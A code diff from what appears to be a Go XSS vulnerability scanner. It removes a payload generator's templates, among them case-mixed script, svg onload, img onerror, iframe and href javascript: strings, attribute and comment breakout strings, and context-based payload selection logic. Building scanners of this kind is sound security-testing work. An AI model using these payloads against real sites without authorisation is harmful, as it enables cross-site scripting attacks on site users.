@@ -58,37 +58,6 @@ func RandStringRunes(n int) string {
 	return string(b)
 }
 
-var (
-	script_payload string = "<ScRiPt>%s</sCrIpT>"
-	img_payload    string = "<img src/onerror=%s>"
-	//img_payload1   string = "\u003c\u0069\u006d\u0067\u0020\u0073\u0072\u0063\u003d\u0078\u0020\u006f\u006e\u0065\u0072\u0072\u006f\u0072\u003d\u0061\u006c\u0065\u0072\u0074\u0028\u002f\u0064\u006f\u006d\u002d\u0078\u0073\u0073\u002f\u0029"
-	href_payload   string = "<a HrEf=JaVaScRiPt:%s>cLiCk</A>"
-	svg_payload    string = "<sVg/OnLoAd=%s>"
-	iframe_payload string = "<IfRaMe SrC=jAvAsCrIpT:%s>"
-	input_payload  string = "<input autofocus onfocus=%s>"
-	svg_payload1   string = "><sVg/OnLoAd=%s>"
-	svg_payload2   string = "\"><sVg/OnLoAd=%s>"
-	svg_payload3   string = "'><sVg/OnLoAd=%s>"
-)
-
-var (
-	flag_tag1       string = "'><%s>//"
-	flag_tag2       string = "\"><%s>//"
-	flag_tag3       string = " ><%s>// "
-	flag_Attibutes1 string = "'%s=prompt(1)'"
-	flag_Attibutes2 string = "\"%s=prompt(1)\""
-	flag_Attibutes3 string = " %s=prompt(1) "
-)
-
-var (
-	comment_payload1 string = "--><%s>"
-	comment_payload2 string = "--!><%s>"
-)
-
-var (
-	javascript string = "javascript:console.log('%s')"
-)
-
 //Generator words和 extension 是映射关系
 type Generator struct {
 	i          int
@@ -283,92 +252,6 @@ func (g *Generator) GeneratorPayload(Tagmode int, flag string, payloaddata paylo
 		g.words = append(g.words, payload)
 		g.mapmode(CheckConsoleLog, "", false)
 	}
-
-	//else if Comment == Tagmode {
-	// 	commentpayload := []string{comment_payload1, comment_payload2}
-	// 	g.words = append(g.words, commentpayload...)
-	// 	g.mapmode(CheckTag, true)
-	// } else if Attibute == Tagmode {
-	// 	switch s := extension.(type) {
-	// 	case ast.Occurence:
-	// 		if funk.Contains(s.Type, "key") {
-	// 			KeyPayload := []string{script_payload,
-	// 				img_payload,
-	// 				href_payload,
-	// 				svg_payload,
-	// 				iframe_payload,
-	// 				input_payload,
-	// 				svg_payload1,
-	// 				svg_payload2,
-	// 				svg_payload3}
-	// 			g.words = append(g.words, KeyPayload...)
-	// 			g.mapmode(CheckValue, true)
-	// 		} else if funk.Contains(s.Type, "value") {
-	// 			if ok, _ := CheckHtmlNodeAttributes(s, "key", "srcdoc", false); ok {
-	// 				//替换'<'和'>'为 url 编码
-	// 				ValuePayload := []string{script_payload,
-	// 					img_payload,
-	// 					href_payload,
-	// 					svg_payload,
-	// 					iframe_payload,
-	// 					input_payload,
-	// 					svg_payload1,
-	// 					svg_payload2,
-	// 					svg_payload3}
-	// 				newValuePayload := funk.Map(ValuePayload, func(payload string) string {
-	// 					Lstr := strings.Replace(payload, "<", "%26lt;", -1)
-	// 					Rstr := strings.Replace(Lstr, ">", "%26gt;", -1)
-	// 					return Rstr
-	// 				})
-	// 				switch v := newValuePayload.(type) {
-	// 				case []string:
-	// 					g.words = append(g.words, v...)
-	// 					g.mapmode(CheckValue, true)
-	// 				}
-	// 			}
-	// 			//处理链接属性
-	// 			ok, _ := CheckHtmlNodeAttributes(s, "key", "href", false)
-	// 			ok1, _ := CheckHtmlNodeAttributes(s, "val", flag, false)
-	// 			if ok && ok1 {
-	// 				ValuePayload := []string{javascript}
-	// 				g.words = append(g.words, ValuePayload...)
-	// 				g.mapmode(CheckConsoleLog, false)
-	// 			}
-	// 			//处理onerror等on开头的属性情况
-	// 			if ok, Kv := CheckHtmlNodeAttributes(s, "key", "on", true); ok {
-	// 				script := Kv.V.String()
-	// 				payload, err := ast.AnalyseJSFuncByFlag(flag, script)
-	// 				if err != nil {
-	// 					return err
-	// 				}
-	// 				log.Info("Attributes generator payload:%s", payload)
-	// 				g.words = append(g.words, payload)
-	// 				g.mapmode(CheckConsoleLog, false)
-	// 			}
-	// 			//处理默认情况
-	// 			ValuePayload0 := []string{flag_tag1, flag_tag2, flag_tag3}
-	// 			g.words = append(g.words, ValuePayload0...)
-	// 			g.mapmode(CheckTag, true)
-	// 			ValuePayload1 := []string{flag_Attibutes1, flag_Attibutes2, flag_Attibutes3}
-	// 			g.words = append(g.words, ValuePayload1...)
-	// 			g.mapmode(CheckConsoleLog, false)
-	// 		}
-	// 	}
-	// } else if Script == Tagmode {
-	// 	switch s := extension.(type) {
-	// 	case ast.Occurence:
-	// 		payload, err := ast.AnalyseJSFuncByFlag(flag, s.Details.Content)
-	// 		if err != nil {
-	// 			return err
-	// 		}
-	// 		log.Info("Script generator payload:%s", payload)
-	// 		payloads := []string{payload}
-	// 		g.words = append(g.words, payloads...)
-	// 		test1 := fmt.Sprintf("';alert(%s);//", flag)
-	// 		g.words = append(g.words, test1)
-	// 		g.mapmode(CheckConsoleLog, false)
-	// 	}
-	// }
 	return nil
 }
 
